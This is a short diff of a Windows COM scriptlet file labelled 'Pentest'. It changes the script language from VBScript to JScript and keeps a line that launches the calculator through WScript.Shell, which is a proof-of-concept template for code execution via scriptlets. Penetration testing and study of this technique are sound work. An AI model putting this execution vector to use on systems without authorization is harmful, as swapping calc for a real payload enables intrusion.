@@ -2,12 +2,13 @@
 <scriptlet>
 <registration         
 progid="Pentest"       
-classid="{000cf35c-0000-0000-0000-53f1dabbf371}" >
-<script language="VBScript">
+classid="{0000f35c-0000-0000-0000-53f1dabbf371}" >
+<script language="JScript">
  
 <![CDATA[   
-	CreateObject("WScript.Shell").Run("calc") 
+var r = new ActiveXObject("WScript.Shell").Run("calc"); 
 ]]>
+ 
 </script>
 </registration>
 </scriptlet>
